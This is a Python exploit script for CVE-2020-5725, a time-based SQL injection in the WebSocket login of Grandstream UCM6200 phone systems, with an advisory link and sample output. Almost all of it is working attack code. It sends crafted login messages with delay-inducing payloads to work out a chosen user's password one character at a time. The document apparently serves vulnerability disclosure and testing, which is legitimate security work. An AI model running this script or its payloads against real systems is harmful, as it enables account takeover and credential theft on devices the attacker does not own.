# Exploit Author: Jacob Baines
# Vendor Homepage: http://www.grandstream.com/
# Software Link: http://www.grandstream.com/support/firmware/ucm62xx-official-firmware
# Version: 1.0.20.20 and below
# Tested on: Grandstream UCM6202 1.0.20.20
# CVE : CVE-2020-5725
# Grandstream UCM6200 Series WebSocket 1.0.20.20 SQL Injection Password Disclosure via Login (time based)
# Advisory: https://www.tenable.com/security/research/tra-2020-17
# Sample output:
#
# albinolobster@ubuntu:~$ python3 websockify_login_injection.py --rhost 192.168.2.1 --user lolwat
# [+] Password length is 9
# [+] Discovering password...
# LabPass1%
# [+] Done! The password is LabPass1%

import sys
import ssl
import time
import asyncio
import argparse
import websockets

async def password_guess(ip, port, username):

    # the path to exploit
    uri = &#039;wss://&#039; + ip + &#039;:&#039; + str(8089) + &#039;/websockify&#039;

    # no ssl verification
    ssl_context = ssl.SSLContext()
    ssl_context.verify_mode = ssl.CERT_NONE
    ssl_context.check_hostname = False

    # determine the length of the password. The timeout is 10 seconds...
probably
    # way too long but whatever.
    length = 0
    while length < 100:
        async with websockets.connect(uri, ssl=ssl_context) as websocket:
            start = time.time()
            login =
&#039;{"type":"request","message":{"transactionid":"123456789zxa","action":"login","username":"&#039;
+ username + &#039;\&#039; AND LENGTH(user_password)==&#039; + str(length) + &#039; AND
88=LIKE(\&#039;ABCDEFG\&#039;,UPPER(HEX(RANDOMBLOB(500000000/2)))) or
\&#039;1\&#039;=\&#039;2","token":"lolwat"}}&#039;
            await websocket.send(login)
            response = await websocket.recv()

            if (time.time() - start) < 5:
                length = length + 1
                continue
            else:
                break

    # if we hit max password length than we&#039;ve done something wrong
    if (length == 100):
        print(&#039;[+] Couldn\&#039;t determine the passwords length.&#039;)
        sys.exit(1)

    print(&#039;[+] Password length is&#039;, length)
    print(&#039;[+] Discovering password...&#039;)

    # Now that we know the password length, just guess each password byte
until
    # we&#039;ve reached the full length. Again timeout set to 10 seconds.
    password = &#039;&#039;
    while len(password) < length:
        value = 0x20
        while value < 0x80:
            if value == 0x22 or value == 0x5c:
                temp_pass = password + &#039;\\&#039;
                temp_pass = temp_pass + chr(value)
            else:
                temp_pass = password + chr(value)

            temp_pass_len = len(temp_pass)

            start = time.time()

            async with websockets.connect(uri, ssl=ssl_context) as
websocket:
                challenge =
&#039;{"type":"request","message":{"transactionid":"123456789zxa","action":"login","username":"&#039;
+ username + &#039;\&#039; AND user_password LIKE \&#039;&#039; + temp_pass +&#039;%\&#039; AND
substr(user_password,1,&#039; + str(temp_pass_len) + &#039;) = \&#039;&#039; + temp_pass + &#039;\&#039;
AND 88=LIKE(\&#039;ABCDEFG\&#039;,UPPER(HEX(RANDOMBLOB(500000000/2)))) or
\&#039;1\&#039;=\&#039;2","token":"lolwat"}}&#039;
                await websocket.send(challenge)
                response = await websocket.recv()

            if (time.time() - start) < 5:
                value = value + 1
                continue
            else:
                print(&#039;\r&#039; + temp_pass, end=&#039;&#039;)
                password = temp_pass
                break

        if value == 0x80:
            print(&#039;&#039;)
            print(&#039;[-] Failed to determine the password.&#039;)
            sys.exit(1)

    print(&#039;&#039;)
    print(&#039;[+] Done! The password is&#039;, password)

top_parser = argparse.ArgumentParser(description=&#039;&#039;)
top_parser.add_argument(&#039;--rhost&#039;, action="store", dest="rhost",
required=True, help="The remote host to connect to")
top_parser.add_argument(&#039;--rport&#039;, action="store", dest="rport", type=int,
help="The remote port to connect to", default=8089)
top_parser.add_argument(&#039;--user&#039;, action="store", dest="user",
required=True, help="The user to brute force")
args = top_parser.parse_args()

asyncio.get_event_loop().run_until_complete(password_guess(args.rhost,
args.rport, args.user))

